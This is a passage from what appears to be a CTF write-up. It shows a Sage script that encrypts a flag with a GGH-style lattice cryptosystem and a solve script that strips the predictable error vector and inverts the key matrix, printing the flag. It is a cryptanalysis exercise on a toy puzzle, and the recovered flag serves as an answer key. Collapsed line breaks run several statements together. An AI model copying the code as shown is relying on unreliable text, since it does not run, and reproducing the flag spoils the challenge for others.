V,W = get_key(n) gift = str(hex(randint(70, 80))).zfill(5).encode('utf-8')flag =  gift + flagprint(flag)m = [i for i in flag]pad = [randint(-128, 127) for i in range(n-len(m)) ]m = vector(ZZ, m + pad)r = vector(get_error(n,delta))c = m * W + rassert floor((r).norm()) == delta*(floor(sqrt(n)))
with open('pubkey.txt', 'w') as f:    f.write(str(W))
with open('ciphertext.txt', 'w') as f:    f.write(str(c))
```



```
# sage
n = 260delta = 7
def read_as_matrix(filename): m = [] with open(filename,'r') as file: data = file.readlines() for i in data[:-1]: data2 = list(map(int,(i[1:-2].split()))) m.append(data2) m.append(list(map(int,(data[-1][1:-1].split())))) return Matrix(m)
def get_error(n,delta): k = 4*delta -2 tmp = [] tmp += [delta - 2]*(n//k) tmp += [delta - 1]*( ((k-2)*n) // (2*k)) tmp += [delta]*(n//k) tmp += [delta + 1]*( ((k-2)*n) // (2*k)) return tmp
W = read_as_matrix("pubkey.txt")with open('ciphertext.txt', 'r') as f: c = f.readline()c = eval(c)c = vector(c)r = vector(get_error(n,delta))mw = c - rflag = mw/Wprint(bytes(flag[:49]))# b'00x4dnkctf{G0od_Y0u_Ar3_Kn0W_Ggh_Crypt0syst3m!!!}'
```


---
## 附图

![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/03/1-1711676313.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/03/7-1711676313.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/03/0-1711676314.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/03/1-1711676314.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/03/2-1711676315.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/03/10-1711676316.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/03/9-1711676316.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/03/7-1711676316.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/03/2-1711676317.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/03/3-1711676317.png)